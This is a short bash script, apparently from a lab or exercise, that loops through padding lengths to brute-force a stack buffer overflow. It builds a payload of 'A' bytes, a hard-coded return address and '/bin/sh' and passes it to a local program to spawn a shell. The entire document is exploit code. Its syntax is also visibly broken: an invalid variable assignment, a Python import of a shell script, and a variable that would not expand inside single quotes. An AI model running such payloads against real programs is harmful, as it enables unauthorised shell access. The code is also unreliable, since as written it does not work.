#!/bin/bash

for i in {0..40..2}
  do
  $j = i
  echo `python -c 'import sploit4.sh; print("A"*$j+"\x30\xb0\xe0\xb7"+"AAAA"+"/bin/sh")'` > overflow
  ./sploit.sh 24 overflow
  sleep .1
 done
